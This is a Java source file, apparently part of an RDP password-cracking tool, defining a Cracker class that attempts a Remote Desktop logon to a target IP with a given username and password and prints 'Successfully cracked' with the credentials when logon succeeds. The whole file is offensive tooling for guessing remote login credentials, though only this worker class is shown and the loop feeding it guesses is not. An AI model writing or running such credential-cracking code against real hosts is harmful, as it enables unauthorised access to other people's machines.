package com.redpois0n;

import com.lixia.rdp.RdesktopSwing;
import com.lixia.rdp.RdpJPanel;


public class Cracker implements Runnable {
	
	private String ip = "HIDDEN";
	private String username = "HIDDEN";
	private String password = "HIDDEN";
	
	private RdpJPanel panel;
	private RdesktopSwing swing;

	@Override
	public void run() {
		try {
			String[] args = new String[] { "-u", username, "-p", password, ip };
			RdesktopSwing.init(args, this);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void loggedOn() {
		System.out.println("Successfully cracked " + ip + " with username " + username + " with password " + password);
		
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(String password) {
		this.password = password;
	}

	public RdpJPanel getPanel() {
		return panel;
	}

	public void setPanel(RdpJPanel panel) {
		this.panel = panel;
	}

	public RdesktopSwing getSwing() {
		return swing;
	}

	public void setSwing(RdesktopSwing swing) {
		this.swing = swing;
	}

}
